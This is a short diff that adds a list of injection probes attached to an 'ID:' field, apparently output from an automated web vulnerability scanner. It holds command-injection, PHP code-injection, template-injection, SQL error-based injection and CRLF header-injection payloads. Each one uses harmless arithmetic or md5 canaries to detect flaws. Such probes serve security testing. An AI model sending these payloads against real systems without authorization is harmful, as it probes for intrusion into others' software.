@@ -1,0 +1,26 @@
+ID:1
+ID:1\
+ID:1
+ID:1
+expr 926196767 + 875226273
+
+ID:1|expr 811297990 + 990387198 
+ID:1$(expr 988603634 + 838730310)
+ID:1&set /A 843794687+956461382
+ID:${@var_dump(md5(810418238))};
+ID:'-var_dump(md5(340095292))-'
+ID:/*1*/{{808731004+914992517}}
+ID:${919468331+823004010}
+ID:${(879656207+891466038)?c}
+ID:#set($c=867316091+923592359)${c}$c
+ID:<%- 897956136+891063104 %>
+ID:1
+ID:1
+ID:1
+ID:1'and/**/extractvalue(1,concat(char(126),md5(1940166094)))and'
+ID:1"and/**/extractvalue(1,concat(char(126),md5(1173666609)))and"
+ID:1
+CRLF-Header:CRLF-Value
+ID:mbcryjptsrljqlryhjwq
+ID:1%0d%0aCRLF-Header:CRLF-Value
+ID:1\r\nCRLF-Header:CRLF-Value
